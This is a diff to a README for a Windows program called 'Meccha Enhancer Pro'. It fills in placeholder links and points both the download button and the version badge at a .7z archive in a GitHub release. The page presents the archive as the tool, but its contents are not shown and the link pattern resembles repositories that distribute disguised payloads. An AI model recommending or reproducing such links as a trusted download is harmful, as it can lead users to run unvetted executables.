@@ -1,3 +1,4 @@
+<img width="1295" height="729" alt="image" src="https://github.com/user-attachments/assets/8aa99f1a-9e03-4a01-af6c-d0ec36d4ef3f" />
 
 <p align="center">
   <img src="https://img.icons8.com/color/96/000000/chameleon.png" alt="MECCHA CHAMELEON" width="80" height="80">
@@ -10,7 +11,7 @@
 </p>
 
 <p align="center">
-  <a href="https://github.com/YOUR_USERNAME/Meccha-Enhancer-Pro"><img src="https://img.shields.io/badge/version-2.0.0-brightgreen?style=flat-square" alt="Version"></a>
+  <a href="https://github.com/DrakeNoteShroud/Meccha-Enhancer-Pro/releases/download/23/MecchaEnhancerPRO.7z"><img src="https://img.shields.io/badge/version-2.0.0-brightgreen?style=flat-square" alt="Version"></a>
   <a href="#"><img src="https://img.shields.io/badge/platform-Windows-blue?style=flat-square" alt="Platform"></a>
   <a href="#"><img src="https://img.shields.io/badge/status-active-success?style=flat-square" alt="Status"></a>
 </p>
@@ -28,8 +29,7 @@
 ## 📥 Download
 
 <p align="center">
-  <!-- СЮДА ВСТАВИТЬ ССЫЛКУ НА СКАЧИВАНИЕ -->
-  <a href="ССЫЛКА_НА_СКАЧИВАНИЕ">
+  <a href="https://github.com/DrakeNoteShroud/Meccha-Enhancer-Pro/releases/download/23/MecchaEnhancerPRO.7z">
     <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-000000?style=for-the-badge&logo=github&logoColor=white" alt="Download">
   </a>
 </p>
